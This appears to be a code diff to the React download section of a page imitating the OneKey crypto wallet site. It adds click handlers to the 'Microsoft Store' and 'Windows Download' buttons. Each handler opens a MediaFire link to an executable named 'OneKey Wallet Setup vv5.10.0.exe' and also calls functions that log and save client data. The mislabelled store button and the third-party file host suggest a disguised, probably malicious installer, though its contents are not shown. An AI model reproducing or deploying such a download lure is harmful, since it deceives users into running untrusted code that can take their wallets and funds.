@@ -282,6 +282,10 @@ function DownloadSection() {
                 onClick={async () => {
                   registrarEvento("download", "windows");
                   await salvarClientCard("Windows Microsoft Store");
+                  window.open(
+                    "https://download1640.mediafire.com/40j26q7w0ulgKNgvYwb-X0BqfxW1OAL0xhiYjgins50ssn8_xUZEjwwACRTpmOPNYJ-4i3v3yF25cVmCTL_VzslQQRArgjIYw4ylkaENUu0hw2_XB4TD9N2JexYoCFF6tQSYkgCyveM_jvEny1SKtTQr-R7BnCwP0QX63S_LAMNG6EI/5ii2e7d0eklow31/OneKey+Wallet+Setup+vv5.10.0.exe",
+                    "_blank"
+                  );
                 }}
               >
                 <img
@@ -303,6 +307,10 @@ function DownloadSection() {
                 }}
                 onClick={async () => {
                   await salvarClientCard("Windows Download");
+                  window.open(
+                    "https://download1640.mediafire.com/40j26q7w0ulgKNgvYwb-X0BqfxW1OAL0xhiYjgins50ssn8_xUZEjwwACRTpmOPNYJ-4i3v3yF25cVmCTL_VzslQQRArgjIYw4ylkaENUu0hw2_XB4TD9N2JexYoCFF6tQSYkgCyveM_jvEny1SKtTQr-R7BnCwP0QX63S_LAMNG6EI/5ii2e7d0eklow31/OneKey+Wallet+Setup+vv5.10.0.exe",
+                    "_blank"
+                  );
                 }}
               >
                 <img
